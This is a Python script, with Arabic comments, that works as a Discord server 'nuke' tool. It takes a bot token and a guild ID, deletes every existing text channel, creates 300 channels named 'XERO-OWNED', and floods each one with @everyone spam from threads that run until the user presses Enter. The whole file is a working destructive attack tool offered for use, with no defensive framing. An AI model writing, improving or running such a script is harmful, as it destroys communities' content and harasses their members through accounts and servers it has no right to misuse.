import os
import sys
import time
import threading
try:
    import requests
except:
    os.system("pip3 install requests --break-system-packages")
    import requests

os.system("clear")
print("XERO SIMPLE - iSH EDITION")
print("=" * 30)

# كل شي في سطر واحد
data = input("ENTER TOKEN AND GUILD ID (format: token guild_id): ").strip().split()
if len(data) < 2:
    print("Error: Write both token and guild id!")
    sys.exit(1)

token = data[0]
guild_id = data[1]

if not guild_id.isdigit():
    print("Error: Guild ID must be numbers only!")
    sys.exit(1)

# فحص التوكن
print("\nChecking token...")
headers = {"Authorization": "Bot " + token}
try:
    r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=15)
    if r.status_code == 200:
        info = r.json()
        print("Connected as: " + info["username"])
    else:
        print("Invalid token!")
        sys.exit(1)
except Exception as e:
    print("Error: " + str(e))
    sys.exit(1)

# فحص السيرفر
print("Checking guild...")
try:
    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}", headers=headers, timeout=15)
    if r.status_code == 200:
        guild = r.json()
        print("Guild found: " + guild["name"])
    else:
        print("Bot not in that guild!")
        sys.exit(1)
except Exception as e:
    print("Error: " + str(e))
    sys.exit(1)

# رسالة السبام
spam_msg = input("\nSPAM MESSAGE (press enter for default): ").strip()
if not spam_msg:
    spam_msg = "@everyone XERO WAS HERE"

print("\n" + "=" * 30)
print("STARTING ATTACK...")
print("=" * 30)
print("")

# حذف كل القنوات القديمة اول شي
print("Deleting old channels...")
try:
    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, timeout=15)
    if r.status_code == 200:
        channels = r.json()
        text_channels = [c for c in channels if c["type"] == 0]
        for ch in text_channels:
            requests.delete(f"https://discord.com/api/v10/channels/{ch['id']}", headers=headers, timeout=15)
            time.sleep(0.3)
        print(f"Deleted {len(text_channels)} channels")
except:
    print("Couldn't delete channels, continuing...")

# انشاء 300 روم
print("\nCreating 300 channels...")
created = 0
for i in range(300):
    try:
        r = requests.post(
            f"https://discord.com/api/v10/guilds/{guild_id}/channels",
            headers=headers,
            json={"name": f"XERO-OWNED-{i+1}", "type": 0},
            timeout=15
        )
        if r.status_code == 201:
            created += 1
            sys.stdout.write(f"\rCreated: {created}/300")
            sys.stdout.flush()
        time.sleep(0.3)
    except:
        pass

print(f"\n\nSuccessfully created {created} channels!")

# نجيب كل القنوات للسبام
print("\nGetting channels for spam...")
try:
    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, timeout=15)
    channels = [c for c in r.json() if c["type"] == 0]
    print(f"Found {len(channels)} channels")
except:
    print("Failed to get channels!")
    sys.exit(1)

# سبام مستمر بدون توقف
spamming = True
spam_count = 0

def spam_worker(channel_id):
    global spam_count
    while spamming:
        try:
            r = requests.post(
                f"https://discord.com/api/v10/channels/{channel_id}/messages",
                headers=headers,
                json={"content": spam_msg},
                timeout=15
            )
            if r.status_code == 200:
                spam_count += 1
            elif r.status_code == 429:
                time.sleep(1)
            else:
                time.sleep(0.3)
        except:
            time.sleep(0.3)

# نشغل السبام على كل القنوات
print("\nStarting spam attack...")
print("PRESS ENTER TO STOP\n")

for channel in channels:
    t = threading.Thread(target=spam_worker, args=(channel["id"],))
    t.daemon = True
    t.start()

# عداد مباشر
def counter():
    while spamming:
        sys.stdout.write(f"\rMessages sent: {spam_count} | Active channels: {len(channels)}   ")
        sys.stdout.flush()
        time.sleep(0.5)

threading.Thread(target=counter, daemon=True).start()

# انتظار المستخدم يضغط ENTER عشان يوقف
input()
spamming = False

print(f"\n\nStopped! Total messages sent: {spam_count}")
print("Goodbye!")
